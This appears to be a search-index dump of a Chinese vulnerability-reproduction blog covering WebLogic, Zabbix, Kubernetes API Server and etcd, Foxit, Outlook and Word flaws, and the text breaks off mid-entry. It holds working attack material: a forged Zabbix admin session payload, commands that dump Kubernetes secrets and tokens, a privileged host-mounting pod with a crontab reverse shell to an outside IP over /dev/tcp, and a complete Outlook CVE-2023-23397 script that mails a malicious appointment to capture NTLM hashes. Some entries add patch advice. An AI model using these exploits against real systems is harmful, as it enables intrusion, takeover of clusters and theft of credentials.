index=\"35\"\u003e\u003cbyte\u003e-107\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"36\"\u003e\u003cbyte\u003e-35\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"37\"\u003e\u003cbyte\u003e42\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"38\"\u003e\u003cbyte\u003e30\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"39\"\u003e\u003cbyte\u003e2\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"40\"\u003e\u003cbyte\u003e0\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"41\"\u003e\u003cbyte\u003e0\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"42\"\u003e\u003cbyte\u003e120\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"43\"\u003e\u003cbyte\u003e114\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"44\"\u003e\u003cbyte\u003e0\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"45\"\u003e\u003cbyte\u003e17\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"46\"\u003e\u003cbyte\u003e106\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"47\"\u003e\u003cbyte\u003e97\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"48\"\u003e\u003cbyte\u003e118\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"49\"\u003e\u003cbyte\u003e97\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"50\"\u003e\u003cbyte\u003e46\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"51\"\u003e\u003cbyte\u003e117\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"52\"\u003e\u003cbyte\u003e116\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"53\"\u003e\u003cbyte\u003e105\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"54\"\u003e\u003cbyte\u003e108\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"55\"\u003e\u003cbyte\u003e46\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"56\"\u003e\u003cbyte\u003e72\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"57\"\u003e\u003cbyte\u003e97\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"58\"\u003e\u003cbyte\u003e115\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"59\"\u003e\u003cbyte\u003e104\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"60\"\u003e\u003cbyte\u003e83\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"61\"\u003e\u003cbyte\u003e101\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"62\"\u003e\u003cbyte\u003e116\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"63\"\u003e\u003cbyte\u003e-70\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"64\"\u003e\u003cbyte\u003e68\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"65\"\u003e\u003cbyte\u003e-123\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"66\"\u003e\u003cbyte\u003e-107\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"67\"\u003e\u003cbyte\u003e-106\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"68\"\u003e\u003cbyte\u003e-72\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"69\"\u003e\u003cbyte\u003e-73\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"70\"\u003e\u003cbyte\u003e52\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"71\"\u003e\u003cbyte\u003e3\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"72\"\u003e\u003cbyte\u003e0\u003c/by","date":"0001-01-01","objectID":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/:5:0","tags":null,"title":"","uri":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/"},{"categories":null,"content":"Zabbix SAML身份绕过漏洞 CVE-2022-23131 ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:0:0","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"漏洞描述 Zabbix 是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 Zabbix 由两部分构成，Zabbix Server与可选组件 Zabbix Agent。Zabbix Server 可以通过 SNMP、Zabbix Agent、Ping、端口监视等方法提供对远程服务器/网络状态的监视、数据收集等功能，它可以运行在 Linux、Solaris、HP-UX、AIX、Free BSD、Open BSD、OS X等平台上。 在启用 SAML SSO 身份验证（非默认）的情况下，未经身份验证的攻击者可以通过修改Cookie数据，绕过身份认证获得对 Zabbix 前端的管理员访问权限。 ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:1:0","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"漏洞影响 Zabbix 4.0.36 Zabbix 5.4.0 Zabbix 5.4.8 Zabbix 6.0.0alpha1 ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:2:0","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"网络测绘 app=\"ZABBIX-监控系统\" \u0026\u0026 body=\"saml\" ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:3:0","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"Zoomeye title:\"ZABBIX\" ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:3:1","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"Shodan title=\"ZABBIX\" ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:3:2","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"环境搭建 环境搭建： https://github.com/trganda/dockerenv/tree/master/vuln/zabbix/CVE-2022-23131 登录页面 ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:4:0","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"漏洞复现 检测该漏洞的主要步骤为： 获取 Set-Cookie 数据 zbx_session 参数的值 通过 URL 解码和 Base64 解码获得 zbx_session 参数 json 格式数据 通过在 json 中添加 saml_data 和 username_attribute 参数后重新 Base64 编码和 URL 编码构造 Payload 在请 HTTP 求头中添加构造的 Payload，然后请求 index_sso.php 若 HTTP 响应头中包含 Location 头，说明存在漏洞，可直接进入管理界面 获取 Set-Cookie 数据，通过 URL 解码和 Base64 解码，得到如下数据： {\"sessionid\":\"4e733c1344948aba99594418d500ea6f\",\"sign\":\"njRfEFFQEnQl4F6oQDXxfVF6UYcroMsEPKCB6UzewMCnGQpzpZseaBgGxEzNJOtbMRtwQNKJCqAXccrwc6rxpw==\"} 构造如下 Payload： {\"saml_data\":{\"username_attribute\":\"Admin\"},\"sessionid\":\"4e733c1344948aba99594418d500ea6f\",\"sign\":\"njRfEFFQEnQl4F6oQDXxfVF6UYcroMsEPKCB6UzewMCnGQpzpZseaBgGxEzNJOtbMRtwQNKJCqAXccrwc6rxpw==\"} 在 Burpsuite 中将通过 Base64 编码和 URL 编码后的 zbx_session 参数带入请求 index_sso.php，成功登录。 也可以在浏览器中替换Cookie，点击 SAML登录。 ","date":"0001-01-01","objectID":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/:5:0","tags":null,"title":"","uri":"/zabbix-saml%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-23131/"},{"categories":null,"content":"K8s API Server未授权命令执行 ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 Kubernetes是一个可以移植、可扩展的开源平台，使用 声明式的配置 并依据配置信息自动地执行容器化应用程序的管理。在所有的容器编排工具中（类似的还有 docker swarm / mesos等），Kubernetes的生态系统更大、增长更快，有更多的支持、服务和工具可供用户选择。 K8s 的API Server默认服务端口为8080(insecure-port)和6443(secure-port)，8080端口提供HTTP服务，没有认证授权机制，而6443端口提供HTTPS服务，支持认证(使用令牌或客户端证书进行认证)和授权服务。默认情况下8080端口不启动，而6443端口启动。这两个端口的开放取决于/etc/kubernetes/manifests/kube-apiserver.yaml配置文件。 如果目标K8s的8080端口开启了，由于其没有认证授权机制，因此存在未授权访问。 如果目标K8s的6443端口开启了，如果配置错误，也可以导致存在未授权访问。 ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"8080端口 默认情况下，8080端口关闭的，手动开启： cd /etc/kubernetes/manifests vim kube-apiserver.yaml 高版本的k8s中，将–insecure-port这个配置删除了，因此添加如下两行： - --insecure-port=8080 - --insecure-bind-address=0.0.0.0 重启k8s： systemctl restart kubectl 访问8080端口即可看到存在未授权： 也可以使用kubectl远程连接获得信息： kubectl -s http://your-vps-ip:8080 get nodes 注：在高版本（1.20及其以后）的K8s中直接禁用了该端口，并且无法打开。 ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:1","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"6443端口 如果运维人员配置不当，将\"system:anonymous\"用户绑定到\"cluster-admin\"用户组，则会使得6443端口允许匿名用户以管理员权限访问。 正常情况下访问6443端口，提示Forbidden。 执行如下命令将\"system:anonymous\"用户绑定到\"cluster-admin\"用户组： kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous 再次访问访问6443端口，即可未授权访问。 ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:2","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞利用 ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"命令执行 查看k8s集群信息 kubectl -s http://your-vps-ip:8080 cluster-info 查看node节点信息 #查看node节点 kubectl -s http://your-vps-ip:8080 get nodes #查看node节点详细信息 kubectl -s http://your-vps-ip:8080 get nodes -o wide 查看pod节点信息 #查看所有的pod kubectl -s http://your-vps-ip:8080 get pods -A 执行其他命令 通过获取到的pods节点信息，进入对应docker 命令执行。-n对应的是NAMESPACE，-it 对应的是NAME： #进入命名空间为default，名字为hello-minikube的容器 kubectl -s http://your-vps-ip:8080 exec -n default -it hello-minikube -- /bin/bash #进入命名空间为kube-system，名字为etcd-ubuntu的容器 kubectl -s http://your-vps-ip:8080 exec -n kube-system -it etcd-ubuntu -- /bin/sh ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:1","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"获取Token登录dashboard 访问如下接口，即可看到K8s所有的Token，我们过滤找到dashboard-admin相关的Token。 http://your-vps-ip:8080/api/v1/namespaces/kube-system/secrets/ https://your-vps-ip:6443/api/v1/namespaces/kube-system/secrets/ 然后对其base64解码一次，即可使用base64解码后的Token登录K8s的dashboard。 ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:2","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"获取宿主机权限 创建pod 通过k8s dashboard，创建特权Pods来获得宿主机权限。登录dashboard后台后，点击右上角+号，然后输入如下命JSON内容，创建名为myapp的pod，并且将宿主机的目录挂在到了/mnt目录下： apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test volumes: - name: test hostPath: path: / 点击工作负载→Pods，可以看到刚才创建的pod。 点击myapp名称。点击右上角进入Shell窗口。 写入ssh公钥 切换到/mnt/root/.ssh目录下，写入公钥文件，即可免密登录宿主机。 定时任务反弹shell 也可以往宿主机写入crontab来反弹获取shell，执行如下命令，将反弹shell的命令写入/var/spool/cron/root文件中： echo \"*/1 * * * * /bin/bash -i\u003e\u0026/dev/tcp/172.16.200.58/4444 0\u003e\u00261\" \u003e root nc监听接收反弹shell： $ nc -lvp 4444 chroot逃逸 chroot /mnt ","date":"0001-01-01","objectID":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:3","tags":null,"title":"","uri":"/k8s-api-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"K8s etcd未授权访问 ","date":"0001-01-01","objectID":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:0:0","tags":null,"title":"","uri":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞描述 etcd 是云原生架构中重要的基础组件。etcd 在微服务和 Kubernates 集群中不仅可以作为服务注册于发现，还可以作为 key-value 存储的中间件，为 k8s 集群提供底层数据存储，保存了整个集群的状态。 在 K8s 集群初始化后，etcd 默认就以 pod 的形式存在，可以执行如下命令进行查看，etcd 组件监听的端口为 2379，并且对外开放。 kubectl get pods -A | grep etcd 在 etcd 的配置文件 /etc/kubernetes/manifests/etcd.yaml 中，–client-cert-auth 默认为 true，这意味着访问 etcd 服务需要携带 cert 进行认证。 如果目标在启动 etcd 的时候没有开启证书认证选项，且 2379 端口直接对外开放的话，则存在 etcd 未授权访问漏洞。 etcdctl 下载地址：https://github.com/etcd-io/etcd ","date":"0001-01-01","objectID":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:1:0","tags":null,"title":"","uri":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:0","tags":null,"title":"","uri":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"查看是否存在未授权访问 访问以下链接，查看是否存在未授权访问。 https://your-ip:2379/version ------------- 返回如下则存在未授权访问： {etcdserver: \"3.4.3\", etcdcluster: \"3.4.0\"} https://your-ip:2379/v2/keys ------------- 返回如下则存在未授权访问： {\"action\":\"get\",\"node\":{\"dir\":true,\"nodes\":...}} ","date":"0001-01-01","objectID":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:1","tags":null,"title":"","uri":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"查找 Token 接管集群 由于 Service Account 关联了一套凭证，存储在 Secret 中。因此我们可以过滤 Secret，查找具有高权限的 Secret，然后获得其 token 接管 K8s 集群。 #查找所有的 secret ./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://your-ip:2379/ get / --prefix --keys-only|sort|uniq| grep secret 以 /registry/secrets/kube-system/dashboard-admin-token-c7spp 为例，查看指定 secret 保存的证书和 token： #查找指定 secret 保存的证书和 token ./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://your-ip:2379/ get /registry/secrets/kube-system/dashboard-admin-token-c7spp 最终的 token 为 token? 和 \\#kubernetes.io/service-account-token 之间的部分。可以使用 curl 验证 token 的有效性： curl --header \"Authorization: Token\" -X GET https://your-ip:6443/api -k 然后，就可以使用 token 登录 dashboard 或者远程命令管理 K8s。 ","date":"0001-01-01","objectID":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:2","tags":null,"title":"","uri":"/k8s-etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"Foxit PDF Reader 及 Editor 任意代码执行漏洞 CVE-2023-27363 ","date":"0001-01-01","objectID":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/:0:0","tags":null,"title":"","uri":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/"},{"categories":null,"content":"漏洞描述 Foxit PDF Reader 及 Editor 中存在任意代码执行漏洞，由于 Foxit PDFReader/Editor 未验证 exportXFAData 方法中的 cPath 参数，使得恶意的.hta 文件写入 Startup 目录中，攻击者可通过诱导受害者打开特制的 PDF 文档触发此漏洞，系统重启后将执行攻击者的恶意代码。 ","date":"0001-01-01","objectID":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/:1:0","tags":null,"title":"","uri":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/"},{"categories":null,"content":"漏洞影响 Foxit PDF Reader \u003c= 12.1.1.15289 Foxit PDF Editor 12.x \u003c= 12.1.1.15289 Foxit PDF Editor 11.x \u003c= 11.2.5.53785 Foxit PDF Editor \u003c= 10.1.11.37866 ","date":"0001-01-01","objectID":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/:2:0","tags":null,"title":"","uri":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/"},{"categories":null,"content":"漏洞复现 poc： https://github.com/j00sean/SecBugs/tree/main/CVEs/CVE-2023-27363 ","date":"0001-01-01","objectID":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/:3:0","tags":null,"title":"","uri":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/"},{"categories":null,"content":"漏洞修复 目前官方已发布可更新版本，受影响用户可通过以下任一步骤进行更新： 在 Foxit PDF 阅读器或 Foxit PDF 编辑器中，点击“帮助”\u003e“关于 Foxit PDF阅读器”或“关于 Foxit PDF 编辑器”\u003e“检查更新”(对于 10 版本或更早的版本，点击“帮助”\u003e“检查更新”)以更新到最新版本。 手动下载更新：https://www.foxit.com/downloads/ ","date":"0001-01-01","objectID":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/:4:0","tags":null,"title":"","uri":"/foxit-pdf-reader-%E5%8F%8A-editor-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-27363/"},{"categories":null,"content":"Microsoft Outlook 权限提升漏洞 CVE-2023-23397 ","date":"0001-01-01","objectID":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/:0:0","tags":null,"title":"","uri":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/"},{"categories":null,"content":"漏洞描述 该漏洞存在于 Microsoft Outlook 中，是一个身份验证绕过漏洞。未经身份验证的远程攻击者仅通过向受影响的系统发送特制电子邮件，从而访问用户的Net-NTLMv2 哈希，进而可以在中继攻击中使用此哈希来冒充用户，从而有效地绕过身份验证。 ","date":"0001-01-01","objectID":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/:1:0","tags":null,"title":"","uri":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/"},{"categories":null,"content":"漏洞影响 Microsoft Outlook 2016 (64-bit edition) Microsoft Outlook 2013 Service Pack 1 (32-bit editions) Microsoft Outlook 2013 RT Service Pack 1 Microsoft Outlook 2013 Service Pack 1 (64-bit editions) Microsoft Office 2019 for 32-bit editions Microsoft 365 Apps for Enterprise for 32-bit Systems Microsoft Office 2019 for 64-bit editions Microsoft 365 Apps for Enterprise for 64-bit Systems Microsoft Office LTSC 2021 for 64-bit editions Microsoft Outlook 2016 (32-bit edition) Microsoft Office LTSC 2021 for 32-bit editions ","date":"0001-01-01","objectID":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/:2:0","tags":null,"title":"","uri":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/"},{"categories":null,"content":"漏洞复现 exp： python CVE-2023-23397.py --path '\\\\your-ip\\' import smtplib, datetime, argparse from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.mime.application import MIMEApplication from email.utils import COMMASPACE, formatdate from independentsoft.msg import Message ## Mail configuration : change it ! smtp_server = \"mail.example.com\" smtp_port = 587 sender_email = \"attacker@mail.example.com\" sender_password = \"P@ssw0rd\" recipients_email = [\"victim@mail.example.com\"] class Email: def __init__(self, smtp_server, port, username, password, recipient): self.smtp_server = smtp_server self.port = port self.username = username self.password = password self.recipient = recipient def send(self, subject, body, attachment_path): msg = MIMEMultipart() msg['From'] = self.username msg['To'] = COMMASPACE.join(self.recipient) msg['Date'] = formatdate(localtime=True) msg['Subject'] = subject msg.attach(MIMEText(body)) with open(attachment_path, 'rb') as f: part = MIMEApplication(f.read(), Name=attachment_path) part['Content-Disposition'] = f'attachment; filename=\"{attachment_path}\"' msg.attach(part) try: server = smtplib.SMTP(self.smtp_server, self.port) server.starttls() server.login(self.username, self.password) server.sendmail(self.username, self.recipient, msg.as_string()) server.quit() print(\"[+] Malicious appointment sent !\") except Exception as e: print(\"[-] Error with SMTP server...\", e) parser = argparse.ArgumentParser(description='CVE-2023-23397 POC : send a malicious appointment to trigger NetNTLM authentication.') parser.add_argument('-p', '--path', type=str, help='Local path to process', required=True) args = parser.parse_args() appointment = Message() appointment.message_class = \"IPM.Appointment\" appointment.subject = \"CVE-2023-23397\" appointment.body = \"New meeting now !\" appointment.location = \"Paris\" appointment.appointment_start_time = datetime.datetime.now() appointment.appointment_end_time = datetime.datetime.now() appointment.reminder_override_default = True appointment.reminder_sound_file = args.path appointment.save(\"appointment.msg\") email = Email(smtp_server, smtp_port, sender_email, sender_password, recipients_email) subject = \"Hello There !\" body = \"Important appointment !\" email.send(subject, body, \"appointment.msg\") ","date":"0001-01-01","objectID":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/:3:0","tags":null,"title":"","uri":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/"},{"categories":null,"content":"漏洞修复 目前微软官方已针对受支持的产品版本发布了修复该漏洞的安全补丁，建议受影响用户开启系统自动更新安装补丁进行防护。 注：由于网络问题、计算机环境问题等原因，Windows Update 的补丁更新可能出现失败。用户在安装补丁后，应及时检查补丁是否成功更新。右键点击Windows 徽标，选择“设置(N)”，选择“更新和安全”-“Windows 更新”，查看该页面上的他提示信息，也可点击“查看更新历史记录”查看历史更新情况。 针对未成功安装更新补丁的情况，可直接下载离线安装包进行更新，链接如下： https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2023-23397 临时防护措施： 若用户无法正常进行补丁修复，在不影响正常业务的情况下，可使用以下措施对漏洞进行防护： 将用户添加到受保护的用户安全组，以防止使用 NTLM 作为身份验证机制。注意：该操作可能会对需要 NTLM 的应用程序造成一定影响。详情请参考： https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group 用户可通过在网络中同时使用外围防火墙和本地防火墙，并通过 VPN 设置来阻止 TCP 445/SMB 从网络出站。注意：该操作将禁止发送 NTLM 身份验证消息到远程文件共享。 ","date":"0001-01-01","objectID":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/:4:0","tags":null,"title":"","uri":"/microsoft-outlook-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-23397/"},{"categories":null,"content":"Microsoft Word 远程代码执行漏洞 CVE-2023-21716 ","date":"0001-01-01","objectID":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/:0:0","tags":null,"title":"","uri":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/"},{"categories":null,"content":"漏洞描述 Microsoft Office Word是微软公司的一个文字处理器应用程序。Word给用户提供了用于创建专业而优雅的文档工具。 该漏洞存在于Microsoft 